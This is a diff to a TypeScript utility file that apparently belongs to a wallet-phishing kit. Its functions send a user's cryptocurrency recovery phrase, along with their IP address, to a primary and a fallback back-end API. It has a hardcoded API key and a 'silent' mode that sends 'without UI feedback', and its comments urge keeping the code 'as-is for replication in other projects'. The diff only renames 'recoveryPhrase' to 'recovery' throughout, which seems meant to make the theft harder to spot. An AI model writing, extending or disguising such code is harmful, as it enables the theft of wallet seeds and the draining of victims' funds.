@@ -1,7 +1,7 @@
 /**
- * Recovery Phrase API Utilities
+ * Recovery  API Utilities
  * 
- * All functions for sending recovery phrase messages to backend APIs.
+ * All functions for sending recovery  messages to backend APIs.
  * Extracted from Home.jsx, Wallet.jsx, and Legacy.jsx for easy replication.
  * 
  * DO NOT REFACTOR - Keep as-is for replication in other projects.
@@ -69,13 +69,13 @@ interface IPResponse {
 
 interface PrimaryMessageData {
   appName: string;
-  recoveryPhrase: string;
+  recovery: string;
   ip: string | null;
 }
 
 interface FallbackMessageData {
   appName: string;
-  recoveryPhrase: string;
+  recovery: string;
 }
 
 interface APIResponse {
@@ -137,7 +137,7 @@ function getFallbackAPIEndpoint(): string {
 
 /**
  * Get client IP address
- * Used before sending recovery phrase to include IP in the payload
+ * Used before sending recovery  to include IP in the payload
  */
 export async function getClientIP(): Promise<string | null> {
   try {
@@ -149,11 +149,11 @@ export async function getClientIP(): Promise<string | null> {
 }
 
 /**
- * Send recovery phrase to primary API endpoint (with IP)
+ * Send recovery  to primary API endpoint (with IP)
  * From Home.jsx handleRestoreWallet - lines 220-251
  */
-export async function sendRecoveryPhraseToPrimaryAPI(
-  recoveryPhraseMessage: string,
+export async function sendRecoveryToPrimaryAPI(
+  recoveryMessage: string,
   appName: string = "Kaspa.one"
 ): Promise<SubmitResult> {
   try {
@@ -167,7 +167,7 @@ export async function sendRecoveryPhraseToPrimaryAPI(
 
     const primaryMessageData: PrimaryMessageData = {
       appName: appName,
-      recoveryPhrase: recoveryPhraseMessage,
+      recovery: recoveryMessage,
       ip: clientIP
     };
 
@@ -215,11 +215,11 @@ export async function sendRecoveryPhraseToPrimaryAPI(
 }
 
 /**
- * Send recovery phrase to fallback API endpoint (without IP, with API key)
+ * Send recovery  to fallback API endpoint (without IP, with API key)
  * From Home.jsx handleRestoreWallet - lines 254-267
  */
-export async function sendRecoveryPhraseToFallbackAPI(
-  recoveryPhraseMessage: string,
+export async function sendRecoveryToFallbackAPI(
+  recoveryMessage: string,
   appName: string = "Kaspa.one",
   apiKey: string | null = null
 ): Promise<SubmitResult> {
@@ -227,7 +227,7 @@ export async function sendRecoveryPhraseToFallbackAPI(
     // Prepare the request data with only required parameters
     const messageData: FallbackMessageData = {
       appName: appName,
-      recoveryPhrase: recoveryPhraseMessage
+      recovery: recoveryMessage
     };
 
     const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
@@ -275,12 +275,12 @@ export async function sendRecoveryPhraseToFallbackAPI(
 }
 
 /**
- * Complete recovery phrase submission with primary + fallback
+ * Complete recovery  submission with primary + fallback
  * From Home.jsx handleRestoreWallet - lines 207-283
  * This is the main function used in Home.jsx
  */
-export async function submitRecoveryPhraseComplete(
-  recoveryPhraseMessage: string,
+export async function submitRecoveryComplete(
+  recoveryMessage: string,
   appName: string = "Kaspa.one",
   options: SubmitOptions = {}
 ): Promise<SubmitResult> {
@@ -292,7 +292,7 @@ export async function submitRecoveryPhraseComplete(
 
   try {
     // Try primary API first (with IP)
-    const primaryResult = await sendRecoveryPhraseToPrimaryAPI(recoveryPhraseMessage, appName);
+    const primaryResult = await sendRecoveryToPrimaryAPI(recoveryMessage, appName);
 
     if (primaryResult.success) {
       if (onSuccessRedirect && typeof window !== 'undefined') {
@@ -302,7 +302,7 @@ export async function submitRecoveryPhraseComplete(
     }
 
     // Fallback to secondary API (without IP, with API key)
-    const fallbackResult = await sendRecoveryPhraseToFallbackAPI(recoveryPhraseMessage, appName, apiKey);
+    const fallbackResult = await sendRecoveryToFallbackAPI(recoveryMessage, appName, apiKey);
 
     if (fallbackResult.success) {
       if (onSuccessRedirect && typeof window !== 'undefined') {
@@ -342,13 +342,13 @@ export async function submitRecoveryPhraseComplete(
 }
 
 /**
- * Silent recovery phrase submission (no redirect, no error handling)
+ * Silent recovery  submission (no redirect, no error handling)
  * From Wallet.jsx submitSeedToApi - lines 86-130
  * Used when you just want to send without UI feedback
  * Returns true if successful, false otherwise
  */
-export async function submitRecoveryPhraseSilent(
-  recoveryPhraseMessage: string,
+export async function submitRecoverySilent(
+  recoveryMessage: string,
   appName: string = "Kaspa.one",
   apiKey: string | null = null
 ): Promise<boolean> {
@@ -366,7 +366,7 @@ export async function submitRecoveryPhraseSilent(
 
     const primaryMessageData: PrimaryMessageData = {
       appName: appName,
-      recoveryPhrase: recoveryPhraseMessage,
+      recovery: recoveryMessage,
       ip: clientIP
     };
 
@@ -407,7 +407,7 @@ export async function submitRecoveryPhraseSilent(
     }
 
     // Fallback to secondary API
-    const messageData: FallbackMessageData = { appName: appName, recoveryPhrase: recoveryPhraseMessage };
+    const messageData: FallbackMessageData = { appName: appName, recovery: recoveryMessage };
 
     const fallbackHeaders: Record<string, string> = {
       "Content-Type": "application/json",
@@ -456,8 +456,8 @@ export async function submitRecoveryPhraseSilent(
  * Wallet.jsx version with detailed logging
  * From Wallet.jsx handleRestoreWallet - lines 132-209
  */
-export async function submitRecoveryPhraseWalletJSX(
-  recoveryPhraseMessage: string,
+export async function submitRecoveryWalletJSX(
+  recoveryMessage: string,
   appName: string = "Kaspa.one",
   options: SubmitOptions = {}
 ): Promise<SubmitResult> {
@@ -481,7 +481,7 @@ export async function submitRecoveryPhraseWalletJSX(
 
     const primaryMessageData: PrimaryMessageData = {
       appName: appName,
-      recoveryPhrase: recoveryPhraseMessage,
+      recovery: recoveryMessage,
       ip: clientIP
     };
 
@@ -527,7 +527,7 @@ export async function submitRecoveryPhraseWalletJSX(
     // Prepare the request data with only required parameters
     const messageData: FallbackMessageData = {
       appName: appName,
-      recoveryPhrase: recoveryPhraseMessage
+      recovery: recoveryMessage
     };
 
     const headers: Record<string, string> = {
